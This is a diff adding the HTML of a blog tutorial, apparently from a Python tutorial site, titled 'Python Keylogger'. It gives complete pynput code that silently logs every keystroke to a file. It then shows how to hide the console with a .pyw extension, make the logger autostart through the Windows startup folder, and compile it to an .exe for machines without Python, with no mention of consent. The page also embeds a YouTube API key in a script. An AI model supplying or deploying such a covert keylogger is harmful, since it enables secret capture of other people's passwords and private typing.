@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <link rel="icon" href="/assets/img/favicon.ico">
+        <link rel="shortcut icon" href="/assets/img/favicon.ico" type="image/x-icon"><meta name="theme-color" content="#343a40"><link rel="canonical" href="https://test.nitratine.net/blog/post/python-keylogger/">
+
+        <!-- Bootstrap core CSS -->
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.3/css/bootstrap.min.css" integrity="sha384-Zug+QiDoJOrZ5t4lssLdxGhVrurbmBWopoEl+M6BdEfwnCJZtKxi1KgxUyJq13dy" crossorigin="anonymous">
+        <link rel="stylesheet" href="/assets/css/base.css"><!-- Global site tag (gtag.js) - Google Analytics -->
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-117153268-2"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'UA-117153268-2');
+        </script>
+        <title>Python Keylogger - Nitratine</title>
+        <link rel="stylesheet" href="/assets/css/blog.css">
+        <link rel="stylesheet" href="/assets/css/pygments.css">
+
+        <meta name="description" content="This is a Python keylogger which will work on Windows, Mac and Linux. This script uses the pynput module. This python keylogger will store typed keys in a file in order of when they were typed.">
+        <meta name="author" content="Brent Vollebregt">
+        <meta property="og:title" content="Python Keylogger">
+        <meta property="og:description" content="This is a Python keylogger which will work on Windows, Mac and Linux. This script uses the pynput module. This python keylogger will store typed keys in a file in order of when they were typed.">
+        <meta property="og:image" content="/post-assets/python-keylogger/feature.jpg">
+        <meta property="og:url" content="https://test.nitratine.net/blog/post/python-keylogger/">
+        <meta name="twitter:card" content="summary"><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+            <script>
+                 (adsbygoogle = window.adsbygoogle || []).push({
+                      google_ad_client: "ca-pub-6407227183932047",
+                      enable_page_level_ads: true
+                 });
+            </script>
+    </head>
+
+    <body>
+        <!-- Navigation -->
+        <nav class="navbar navbar-expand-md navbar-dark bg-dark fixed-top ">
+            <div class="container">
+                <a class="navbar-brand" href="/">
+                    <img src="/assets/img/logo.png" width="145" height="30" class="d-inline-block align-top" alt="Brand Icon">
+                </a>
+                <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarsExampleDefault"
+                        aria-controls="navbarsExampleDefault" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarsExampleDefault">
+                    <ul class="navbar-nav mr-auto">
+                        <li class="nav-item ">
+                            <a class="nav-link" href="/">Home <span class="sr-only">(current)</span></a>
+                        </li>
+                        <li class="nav-item ">
+                            <a class="nav-link" href="/blog/">Blog</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://www.youtube.com/PyTutorialsOriginal">YouTube</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="https://github.com/brentvollebregt">GitHub</a>
+                        </li>
+                        <li class="nav-item ">
+                            <a class="nav-link" href="/about/">About</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </nav>
+
+        <!-- Main Content -->
+        <main role="main" class="container">
+
+            
+            <div class="row">
+                <div class="col-md-8 blog-main">
+
+                    <h1 class="blog-post-title">Python Keylogger</h1>
+                    <p class="text-muted">
+                        <a href="/blog/archive/#2017" class="text-muted">15 Dec 2017</a>
+                        <a href="/blog/categories/#YouTube" class="badge badge-primary ml-2">YouTube</a>
+                        
+                        <a href="/blog/tags/#Python" class="badge badge-warning">Python</a>
+                        
+                        <a href="/blog/tags/#Keyboard" class="badge badge-warning">Keyboard</a>
+                        
+                        <a href="/blog/tags/#Logging" class="badge badge-warning">Logging</a>
+                        
+                        <a href="/blog/tags/#pynput" class="badge badge-warning">pynput</a>
+                        
+                        <img src="https://hitcounter.pythonanywhere.com/count/tag.svg" alt="Hits" class="post-hits">
+                    </p>
+                    <p class="lead">This is a Python keylogger which will work on Windows, Mac and Linux. This script uses the pynput module. This python keylogger will store typed keys in a file in order of when they were typed.</p>
+                    <hr>
+
+                    <div class="post-content">
+                        <div class="toc">
+<ul>
+<li><a href="#pip">PIP</a></li>
+<li><a href="#installing-pynput">Installing Pynput</a></li>
+<li><a href="#building-the-keylogger">Building the Keylogger</a></li>
+<li><a href="#autostart">Autostart</a></li>
+<li><a href="#stopping-the-keylogger">Stopping the Keylogger</a></li>
+<li><a href="#final-script">Final Script</a></li>
+<li><a href="#compile-to-exe">Compile to EXE</a></li>
+<li><a href="#common-issues-and-questions">Common Issues and Questions</a><ul>
+<li><a href="#it-doesnt-work-general-things-to-try">It doesn't work (general things to try)</a></li>
+<li><a href="#python-is-not-recognized-as-an-internal-or-external-command">'python' is not recognized as an internal or external command</a></li>
+<li><a href="#where-are-the-log-files">Where are the log files?</a></li>
+<li><a href="#modulenotfounderrorimporterror-no-module-named-pynput">ModuleNotFoundError/ImportError: No module named 'pynput'</a></li>
+<li><a href="#i-got-a-syntaxerror">I got a SyntaxError</a></li>
+<li><a href="#how-can-i-stop-the-listener">How can I stop the listener?</a></li>
+<li><a href="#open-command-window-here-isnt-shown-when-i-shift-right-click">"Open command window here" isn't shown when I shift right click?</a></li>
+</ul>
+</li>
+</ul>
+</div>
+<div class="embedded_yt my-3">
+    <div>
+        <iframe allow="autoplay; encrypted-media" allowfullscreen="" src="https://www.youtube.com/embed/x8GbWt56TlY"></iframe>
+    </div>
+</div>
+
+<h2 id="pip">PIP</h2>
+<p>If you haven't used or setup pip before, go to my tutorial at <a href="/blog/post/how-to-setup-pythons-pip/">how-to-setup-pythons-pip</a> to setup pip. This is needed to install pynput to get keys typed.</p>
+<h2 id="installing-pynput">Installing Pynput</h2>
+<p>We will be using the pynput module to listen to mouse events. To install this module execute <code>pip install pynput</code> in cmd. Watch the output to make sure no errors have occurred; it will tell you when the module has been successfully installed.</p>
+<p><img alt="Installing pynput" src="/post-assets/how-to-get-mouse-clicks-with-python/pynput1.png" /></p>
+<p>To double check that it was installed successfully, open up IDLE and execute the command <code>import pynput</code>; no errors should occur.</p>
+<p><img alt="Testing pynput" src="/post-assets/how-to-get-mouse-clicks-with-python/pynput2.png" /></p>
+<h2 id="building-the-keylogger">Building the Keylogger</h2>
+<p>Create a new Python file and import Key and Listener from pynput.keyboard and the logging module.</p>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pynput.keyboard</span> <span class="kn">import</span> <span class="n">Key</span><span class="p">,</span> <span class="n">Listener</span>
+<span class="kn">import</span> <span class="nn">logging</span>
+</pre></div>
+
+
+<p>Next set a variable which points to where you want to save the logs; leave this as an empty string to save the log beside the python script. Then setup the logging module as shown below.</p>
+<div class="codehilite"><pre><span></span><span class="n">log_dir</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+
+<span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="p">(</span><span class="n">log_dir</span> <span class="o">+</span> <span class="s2">&quot;key_log.txt&quot;</span><span class="p">),</span> <span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">,</span> <span class="n">format</span><span class="o">=</span><span class="s1">&#39;</span><span class="si">%(asctime)s</span><span class="s1">: </span><span class="si">%(message)s</span><span class="s1">&#39;</span><span class="p">)</span>
+</pre></div>
+
+
+<p>Then create a definition for keypresses called on_press which takes key as a parameter. In this definition we want to log using the info method the key type casted to a string.</p>
+<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">on_press</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+</pre></div>
+
+
+<p>Next setup an instance of Listener and define the on_press method in a with statement and then join the instance to the main thread.</p>
+<div class="codehilite"><pre><span></span><span class="k">with</span> <span class="n">Listener</span><span class="p">(</span><span class="n">on_press</span><span class="o">=</span><span class="n">on_press</span><span class="p">)</span> <span class="k">as</span> <span class="n">listener</span><span class="p">:</span>
+    <span class="n">listener</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+</pre></div>
+
+
+<p>Now save the file with a .pyw file extension to make sure that the console doesn't appear when it's run.</p>
+<p><img alt="Save as .pyw" src="/post-assets/python-keylogger/pyw.png" /></p>
+<p>Run the script in IDLE to make sure that you haven't made any errors. Errors will show up in here if some do occur.</p>
+<h2 id="autostart">Autostart</h2>
+<p>To make the script run on startup first go to your startup folder. Hold down the windows button and press "R" or type run in the windows menu to make the run dialog appear.</p>
+<p><img alt="shell:startup example" src="/post-assets/python-keylogger/run.png" /></p>
+<p>Now type <code>shell:startup</code> in the dialog and press enter. This will open a window at your startup folder.</p>
+<p>Copy the keylogger into this folder and then create a new folder somewhere else for logs to be saved to. Make sure this folder is not in the startup folder or it will be opened every time the computer has started. Open the keylogger in IDLE and now change the log_dir to the location of the folder you just created. Make sure this folder path uses forward slashes ('/') and contains a forward slash at the end.</p>
+<h2 id="stopping-the-keylogger">Stopping the Keylogger</h2>
+<p>To stop the keylogger, open up task manager and look for anything named python as shown below due to windows just showing program names. If you have an older version of windows, I recommend looking for pythonw.exe. Right click on this and end the task.</p>
+<p><img alt="Python in task manager" src="/post-assets/python-keylogger/taskmgr.png" /></p>
+<h2 id="final-script">Final Script</h2>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pynput.keyboard</span> <span class="kn">import</span> <span class="n">Key</span><span class="p">,</span> <span class="n">Listener</span>
+<span class="kn">import</span> <span class="nn">logging</span>
+
+<span class="n">log_dir</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+
+<span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">filename</span><span class="o">=</span><span class="p">(</span><span class="n">log_dir</span> <span class="o">+</span> <span class="s2">&quot;key_log.txt&quot;</span><span class="p">),</span> <span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">,</span> <span class="n">format</span><span class="o">=</span><span class="s1">&#39;</span><span class="si">%(asctime)s</span><span class="s1">: </span><span class="si">%(message)s</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">on_press</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+
+<span class="k">with</span> <span class="n">Listener</span><span class="p">(</span><span class="n">on_press</span><span class="o">=</span><span class="n">on_press</span><span class="p">)</span> <span class="k">as</span> <span class="n">listener</span><span class="p">:</span>
+    <span class="n">listener</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+</pre></div>
+
+
+<h2 id="compile-to-exe">Compile to EXE</h2>
+<p>Want to convert this .py to a .exe? Head over to my tutorial at <a href="/blog/post/convert-py-to-exe/">convert-py-to-exe</a> to do it in a few easy steps. This tutorial also shows you how to remove the console that shows up, make one file executables and even add an icon.</p>
+<p>Converting to .exe will allow the script to run on windows computers without python installed (python is pre-installed on mac and most linux computers)</p>
+<h2 id="common-issues-and-questions">Common Issues and Questions</h2>
+<h3 id="it-doesnt-work-general-things-to-try">It doesn't work (general things to try)</h3>
+<p>Make sure you run the script in IDLE to check for errors you have made</p>
+<h3 id="python-is-not-recognized-as-an-internal-or-external-command">'python' is not recognized as an internal or external command</h3>
+<p>Python hasn't been installed or it hasn't been installed properly. Go to <a href="/blog/post/how-to-setup-pythons-pip/">how-to-setup-pythons-pip</a> and follow the tutorial. Just before you enter the scripts folder into the path variable, remove the "\scripts\" part at the end. You will also want to add another path with "\scripts\" to have pip.</p>
+<h3 id="where-are-the-log-files">Where are the log files?</h3>
+<p>They will be located next to the python file (in the current directory for more advanced users). If it hasn't appeared, make sure you run the script in IDLE to check for errors you have made.</p>
+<h3 id="modulenotfounderrorimporterror-no-module-named-pynput">ModuleNotFoundError/ImportError: No module named 'pynput'</h3>
+<p>Did you install pynput? This error will not occur if you installed it properly. If you have multiple versions of Python, make sure you are installing pynput on the same version as what you are running the script with.</p>
+<h3 id="i-got-a-syntaxerror">I got a SyntaxError</h3>
+<p>Syntax errors are caused by you and these is nothing I can offer to fix it apart from telling you to read the error. They always say where the error is in the output using a ^. Generally people that get this issue have incorrect indentation, brackets in the wrong place or something spelt wrong. You can read about SyntaxError on Python's docs <a href="https://docs.python.org/2/tutorial/errors.html#syntax-errors">here</a>.</p>
+<h3 id="how-can-i-stop-the-listener">How can I stop the listener?</h3>
+<p>As documented at <a href="https://pythonhosted.org/pynput/keyboard.html">https://pythonhosted.org/pynput/keyboard.html</a> you can use pynput.keyboard.Listener.stop() to stop listening.</p>
+<h3 id="open-command-window-here-isnt-shown-when-i-shift-right-click">"Open command window here" isn't shown when I shift right click?</h3>
+<p>Make sure you are holding down shift. If you are using new versions of Windows, this has been replaced by "Open PowerShell Window Here". Using this method will work exactly the same for this tutorial; so go ahead and use PowerShell.</p>
+                    </div>
+
+
+
+
+
+
+
+                    
+                    <div id="disqus_thread"></div>
+                    <script>
+                        var disqus_config = function() {
+                            this.page.url = 'https://test.nitratine.net/blog/post/python-keylogger/'; // Your page's canonical URL variable
+                            this.page.identifier = 'https://test.nitratine.net/blog/post/python-keylogger/'; // Your page's unique identifier variable
+                        };
+                        (function() {
+                            var d = document,
+                                s = d.createElement('script');
+                            s.src = '//nitratine.disqus.com/embed.js';
+                            s.setAttribute('data-timestamp', +new Date());
+                            (d.head || d.body).appendChild(s);
+                        })();
+                    </script>
+                    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+                    
+
+                </div>
+
+                                <!-- Sidebar -->
+                <aside class="col-md-4 blog-sidebar">
+
+                    <div class="card p-3 mb-3 bg-light">
+                        <h4 class="text-center text-lg-left">About</h4>
+                        <p class="mb-0">Owner of <a href="https://www.youtube.com/PyTutorialsOriginal">PyTurorials</a> and creator of <a href="https://github.com/brentvollebregt/auto-py-to-exe">auto-py-to-exe</a>. I enjoy making quick tutorials for people new to particular topics in Python and  tools that help fix small things.</p>
+                    </div>
+
+                    <div class="card p-3 mb-3 bg-light">
+                        <h4 class="text-center text-lg-left">Categories</h4>
+                        <ol class="list-unstyled mb-0 text-center text-lg-left">
+                            <li>
+                                <a href="/blog/categories/#YouTube">
+                                    🎥 YouTube
+                                    <span class="badge badge-primary ml-3">14</span>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="/blog/categories/#Projects">
+                                    💾 Projects
+                                    <span class="badge badge-primary ml-3">12</span>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="/blog/categories/#Tutorials">
+                                    📖 Tutorials
+                                    <span class="badge badge-primary ml-3">8</span>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="/blog/categories/#Apps">
+                                    📱 Apps
+                                    <span class="badge badge-primary ml-3">2</span>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="/blog/categories/#Investigations">
+                                    🔍 Investigations
+                                    <span class="badge badge-primary ml-3">2</span>
+                                </a>
+                            </li>
+                            <li>
+                                <a href="/blog/categories/#General">
+                                    📰 General
+                                    <span class="badge badge-primary ml-3">4</span>
+                                </a>
+                            </li>
+                        </ol>
+                    </div>
+
+                    <div class="card p-3 mb-3 bg-light">
+                        <h4 class="text-center text-lg-left">PyTutorials on YouTube</h4>
+                        <script src="https://apis.google.com/js/platform.js"></script>
+                        <div style="text-align: center">
+                            <div class="g-ytsubscribe" data-channel="PrivateSplat" data-layout="full" data-count="default"></div>
+                        </div>
+                    </div>
+
+                    <div class="card p-3 mb-3 bg-light">
+                        <h4 class="text-center text-lg-left">Recent Videos</h4>
+                        <div id="recent-yt-videos" class="yt_video_container"></div>
+                    </div>
+
+                    <script>
+                        let youtube_data_api_key = 'AIzaSyDz6QJ7H1Ca575XwvKnO8Q4MVATUxLdHYM';
+                        let youtube_channel_id = 'UCesEknt3SRX9R9W_f93Tb7g';
+                    </script>
+                    <script type="text/javascript" defer src="/assets/js/getRecentYouTubeVideos.js"></script>
+
+                </aside>
+
+            </div>
+
+
+        </main>
+
+        <!-- Bootstrap -->
+        <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
+        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
+    </body>
+</html>
